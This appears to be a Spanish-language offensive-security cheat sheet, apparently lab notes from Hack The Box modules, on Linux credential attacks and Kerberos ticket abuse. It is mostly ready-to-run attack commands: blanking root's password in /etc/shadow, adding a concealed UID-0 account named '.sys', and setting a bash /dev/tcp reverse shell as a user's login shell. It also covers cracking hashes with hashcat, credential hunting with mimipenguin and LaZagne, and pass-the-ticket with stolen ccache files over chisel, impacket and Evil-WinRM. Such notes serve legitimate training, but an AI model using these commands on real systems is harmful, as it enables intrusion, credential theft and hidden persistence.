#linux #passwd #shadow #bruteforce #credentialHunting #pastheticket 
## etc/shadow
### Contenido del archivo
``` textplain 
htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
```

| htb-student:  | \$y\$j9T$3QSBB6CbHEu...SNIP...f8Ms: | 18955:                  | 0:           | 99999:       | 7:                  | :                      | :                    | :                  |
| ------------- | ----------------------------------- | ----------------------- | ------------ | ------------ | ------------------- | ---------------------- | -------------------- | ------------------ |
| `<username>`: | `<encrypted password>`:             | `<day of last change>`: | `<min age>`: | `<max age>`: | `<warning period>`: | `<inactivity period>`: | `<expiration date>`: | `<reserved field>` |
### Contenido hash
#### Formato
| `$ <id>` | `$ <salt>` | `$ <hashed>` |
| --- | --- | --- |
| `$ y` | `$ j9T` | `$ 3QSBB6CbHEu...SNIP...f8Ms` |
#### Cuenta bloqueada
Si en el campo `<encrypted password>` nos encontramos el valor `*` ó `!` la cuenta está bloqueada por autenticación mediante contraseña

### Permiso de escritura
#### Dejar campo contraseña vacío
Podemos dejar el campo `<encrypted password>` vacío para poder autenticarnos sin contraseña. Ejemplo: 
```textplain
root::18955:0:99999:7:::
```
Con comando de sustitución:
```bash
sed -i 's|^root:.*:|root::|' /etc/shadow
```

#### Crear nueva contraseña
Si esto no funciona podemos intentar cambiar la contraseña de root utilizando `mkpasswd`

```bash
sed -i "s|^root:.*:|root:$(mkpasswd -m sha-512 'newpass'):|" /etc/shadow
```


## etc/passwd
### Contenido

```textplain
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

| htb-student: | x: | 1000: | 1000: | ,,,: | /home/htb-student: | /bin/bash |
| --- | --- | --- | --- | --- | --- | --- |
| `<username>:` | `<password>:` | `<uid>:` | `<gid>:` | `<comment>:` | `<home directory>:` | `<cmd executed after logging in>` |
El `uid` y `guid` por defecto del usuario `root` son `0`, y en el resto de usuarios, el nombre de usuario y grupo suele empezar a partir del valor `1000`
La `x`en la contraseña indica que la contraseña se guarda en otro archivo (`/etc/shadow`) 
### Permiso de escritura
#### Cambiar el campo `x` por `0`
De esta manera el usuario no deberá introducir contraseña para autenticarse

#### Cambiar el campo `x` por hash
También podemos cambiar el campo `x` hardcodeando el hash de una contraseña generada manualmente con `mkpasswd`ó `openssl`. Ejemplo de creación de contraseña con `openssl`:
```bash
openssl passwd -6 "mi_contraseña"
```

#### Modificar usuario existente en root
Modificar una línea como esta
```textplain
usuario:x:1001:1001:User:/home/usuario:/bin/bash
```
por esta:
```textplain
usuario:x:0:0:User:/root:/bin/bash
```

#### Crear un nuevo usuario que pase desapercibido
Añadir una línea como la que sigue
```textplain
.sys:x:0:0::/root:/bin/bash
```
Creará un usuario con privilegios de root pero es más difícil de detectar porque el nombre empieza por `.`

#### Deshabilitar acceso a usuarios legítimos
Cambiar la shell de un usuario a `/usr/bin/nologin`
```textplain
usuario:x:1001:1001::/home/usuario:/usr/sbin/nologin
```

#### Escalación a través de shell inverso
Para ello habrá que crear un script como el que sigue (supongamos que está en `/usr/local/bin/shell_inverso.sh)
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

darle permisos de ejecución 
```bash
chmod +x /usr/local/bin/shell_inverso.sh
```
y configurar esta línea para un usuario dado:
```textplain
usuario:x:1001:1001::/home/usuario:/usr/local/bin/shell_inverso.sh
```
De esta manera se está cambiando el comportamiento predeterminado del usuario, lo que hace que el usuario no pueda tener acceso a una shell interactiva tradicional, lo que podría levantar sospechas

## Craqueo de contraseñas
Una forma podría ser la siguiente, utilizando `hashcat`
```bash
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```
## /etc/sudoers
- Explicación línea a línea del contenido de `/etc/sudoers`
```bash
<usuario> <maquinas> = (<usuarios_a_impersonar>) <comandos_permitidos>
#Ejemplo de usuario que tiene acceso a todo pero sin contraseña para tcpdump
joe ALL=(ALL) NOPASSWD: /usr/bin/tcpdump 
joe ALL=(ALL) ALL
```
- Si tenemos permiso de escritura sobre este archivo podemos añadir la siguiente línea: 
	```
	myuser ALL=(ALL) NOPASSWD: ALL
	```
## Credential hunting
### Variables de entorno
```bash
env
```
### Archivos de configuración
#### Mostrar archivos de configuración
```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
### Buscar una palabra concreta en archivos del sistema
```bash
grep -r --exclude-dir=/proc --exclude-dir=/sys --exclude-dir=/dev "HTB{" / 2>/dev/null
```
#### Credenciales en archivos de configuración
```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass|\cred" $i 2>/dev/null | grep -v "\#";done
```
### Archivos con otras extensiones
```bash
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
### Bases de datos
```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
### Notas
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
### Scripts
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
### Crontabs
```bash
# Crontab global
cat /etc/crontab
# Scripts programados con /etc/cron
ls -la /etc/cron.*/
# Crontab de un usuario específico
crontab -l -u <usuario>
# Según permisos de escritura
ls -la /var/spool/cron/crontabs/ 
cat /var/spool/cron/crontabs/*
```
### Claves SSH
#### Claves privadas
```bash
 grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```
#### Claves públicas
```bash
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
### Historial y  archivos de configuración
```bash
tail -n5 /home/*/.bash*
```
### Logs
Filtro interesante para aplicar a los logs
```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
### Archivos no vacíos
Busca archivos dentro del directorio actual y subdirectorios que no estén vacíos.
```bash
find . -type f -size +0c
# buscar sobre ellos
find . -type f -size +0c -print0 | xargs -0 grep -iE 'password|username'
```
### Archivos con permisos de escritura
```bash
find / -type d -writable 2>/dev/null
find / -type d -perm -u=w -user $(whoami) 2>/dev/null
```
Para local file inclusion puede ser interesante (porque es accesible a todos los usuarios y aplicaciones)
```bash
/dev/shm
```
### Memoria
#### Mimipenguin
```bash
sudo python3 mimipenguin.py 
sudo bash mimipenguin.sh
```
#### LaZagne
```bash
sudo python3 laZagne.py all
```
### Navegadores
#### Firefox
La información se suele encontrar encriptada en `logins.json` 
```bash 
ls -l ~/.mozilla/firefox/ | grep default
```
#### Firefox-decrytp
Basta ejecutar la herramienta, ya que busca directorios por defecto de credenciales del navegador
```bash
python3 firefox_decrypt.py
```

---
## Linux unidos a AD
Normalmente en este caso la autenticación al dominio siempre será mediante Kerberos
### Información valiosa: ccache keytab y otros archivos

1. **Keytab (comparable a información extraída a NTDS.dit)**:
    - Contiene claves derivadas (como `RC4_HMAC` o `AES256_HMAC`) que representan la contraseña de un usuario o servicio.
    - Es estático: no contiene información activa como tickets o tokens de sesión.
    - Su sensibilidad depende de la cuenta o servicio al que está asociado:
        - Si pertenece a `krbtgt`, podría permitir ataques como Golden Ticket.
        - Para cuentas no privilegiadas, el impacto es menor.
    - No siempre existen archivos de este estilo
1. **Ccache (comparable a volcado de LSASS)** :
    - Contiene tickets Kerberos (TGT y TGS) y claves de sesión.
    - Representa información **temporal y activa** para una sesión específica.
    - Su sensibilidad depende de los privilegios del ticket almacenado:
        - Si es un TGT de un administrador, el atacante podría acceder a recursos restringidos.
        - Si es un ticket de servicio, el impacto se limita al servicio específico.
    - La variable de entorno `KRB5CCNAME` apunta a un archivo **ccache**. Es como si la sesión "cargase" la información del ticket. Esto permite a las aplicaciones y herramientas autenticarse automáticamente utilizando el TGT almacenado en el archivo, sin necesidad de volver a solicitar las credenciales del usuario

| Característica                | **Keytab**                                       | **Ccache**                                |
| ----------------------------- | ------------------------------------------------ | ----------------------------------------- |
| **Contenido principal**       | Claves derivadas (RC4_HMAC, AES128, AES256).     | Tickets Kerberos (TGT y TGS).             |
| **Claves incluidas**          | Claves de autenticación para usuarios/servicios. | Claves de sesión para el TGT/TGS.         |
| **Propósito**                 | Autenticación sin contraseña.                    | Autenticación temporal basada en tickets. |
| **Formato típico**            | Texto o binario.                                 | Binario (protocolo Kerberos).             |
| **Autenticación persistente** | Generar nuevos tickets sin contraseña.           | Usar tickets existentes sin clave.        |
| **Pass-the-Ticket**           | No aplicable directamente.                       | Usar el ccache robado.                    |
| **Pass-the-Key**              | Sí (usando claves RC4 o AES).                    | No (no incluye claves completas).         |
- Además de estas fuentes, archivos de configuración, directorios LDAP, logs, y credenciales en memoria o en disco son objetivos clave para recolectar información sensible. Por ejemplo:
    - Archivos de configuración Kerberos/SSSD (`/etc/krb5.conf` `/etc/sssd/sssd.conf`)
    - Directorio LDAP (Se pueden extraer listas de usuarios, grupos y sus miembros y relaciones de confianza)
    - Cache de Kerberos en memoria (`/proc/<pid>`)
    - Credenciales almacenadas localmente (`~/.k5login`)
### Obtener información del sistema
#### `realm`
Herramienta diseñada para gestionar la unión de sistemas Linux a dominios como AD o cualquier otro servicio compatible con Kerberos/LDAP. Además de mostrarnos si la máquina está unida al dominio nos dará información de cómo está unida, cual es el nombre del dominio, y que usuarios existen en el dominio
```bash
realm list
```
Si esta herramienta no está disponible podemos probar a ver si existen herramientas de AD como  [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html)
#### `PS`
```
ps -ef | grep -i "winbind\|sssd"
```
### keytab
#### Obtener información 
- Buscar archivos con extensión `.keytab`
```bash
	find / -name *keytab* -ls 2>/dev/null
```
- Buscar archivos keytab en cronjobs
```bash
	crontab -l
```
#### Mostrar información de los keytab - `klist`
```bash
klist -k -t /opt/specialfiles/carlos.keytab
```
`-k` (`archivo keytab`) y `-t` (`timestamp`) 
Si no ponemos parámetros se muestra información sobre los tickets Kerberos activos en el contexto del usuario o proceso actual
#### Suplantar la identidad de un usuario - `kinit`
```bash
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```
`-k` (`archivo keytab`)  y  `-t` (`keytab file`)
**IMPORTANTE:** Este comando cambia la información de la variable de entorno `KRB5CCNAME` (por lo que sería conveniente copiar el valor de la variable de entorno antes de ejecutar este comando) y es sensitivo a mayúsculas (el dominio suele ir en mayúsculas) y minúsculas(el nombre de usuario suele ir en minúsculas)
#### Convertir un ticket a hash - keytab extract
Con un ticket tenemos acceso al sistema, pero no a la máquina. Esto nos permite convertir un ticket en un hash, con la idea de encontrar una contraseña válida del usuario de ese ticket. 
Descargamos la herramienta  [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) en nuestra máquina comprometida. Una vez descargada:

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```
mostraría los hashes `NTML`, `AES-256` ó `AES-128`. El hash NTML es el más fácil de crackear (p.ej: con [crackstation](https://crackstation.net/))
### ccache
#### Obtener información
```bash
ls -la /tmp
```
Los archivos ccache son de la forma `krb5cc_<UID>` Necesitaremos permisos de lectura sobre estos archivos para poder realizar alguna de las acciones que se mencionan a continuación. 
#### Importar archivos ccache a nuestra sesión
```bash
klist # mostraría la información del usuario actual
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist # mostrará la información del usuario julio. Habrá que comprobar que la fecha de expiración sea válida
```
Después de esto ya podríamos acceder a otros servicios como `smb` si el nuevo usuario tuviera permisos
```bash
smbclient //dc01/C$ -k -c ls -no-pass
```
### Linux attack tools
#### Configuración de pwnbox no unida al dominio
##### Modificar `/etc/hosts`
Suponiendo un escenario en el que nuestro host no tiene conexión con el `KDC/DC` y no podemos usar el DC para la resolución de nombres
```
172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```
Es mejor configurar correctamente el DNS si está disponible
##### Configuración proxychains
```
at /etc/proxychains.conf 
<SNIP> 
[ProxyList] 
socks5 127.0.0.1 1080
```
##### Descargar chisel en nuestra máquina atacante
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz 
gzip -d chisel_1.7.7_linux_amd64.gz mv chisel_* chisel && chmod +x ./chisel 
sudo ./chisel server --reverse
```
##### Ejecutar chisel desde máquina comprometida
Cuando el cliente ejecuta `R:socks`, Chisel activa un proxy SOCKS en el puerto 1080 de la máquina atacante
```cmd
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```
##### Establecer variable de entorno `KRB5CCNAME` en nuestra máquina atacante
Habrá que transferir primero el archivo ccache a nuestra máquina atacante:
```bash
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```
##### Utilizar impacket sobre proxychains con autenticación kerberos
```bash
proxychains impacket-wmiexec dc01 -k
```
`-k` indica autenticación kerberos. Es necesario poner el nombre de la máquina (`dc01` en este caso) y no su dirección ip
##### Evil-WinRM
Si tenemos instalado `krb5-user` (como es el caso en linux), necesitamos cambiar el archivo  `/etc/krb5.conf`  para incluir los siguientes valores:
```bash
an0nio@htb[/htb]$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```
Con esta configuración ya se puede utilizar `Evil-WinRM` del siguiente modo:
```bash
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```
#### Misceláneo
##### Convertir ccache file a .kirbi válido para Windows
```bash
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
##### Importar el ticket en una sesión Windows con Rubeus

```bash
C:\\htb> C:\\tools\\Rubeus.exe ptt /ticket:c:\\tools\\julio.kirbi
```

##### Linikatz

[Linikatz](https://github.com/CiscoCXSecurity/linikatz)  es una herramienta creada para explotar credenciales en máquinas Linux que están integradas en un AD

```bash
wget <https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh>
/opt/linikatz.sh
#una vez ejecutado nos muestra información automáticamente
```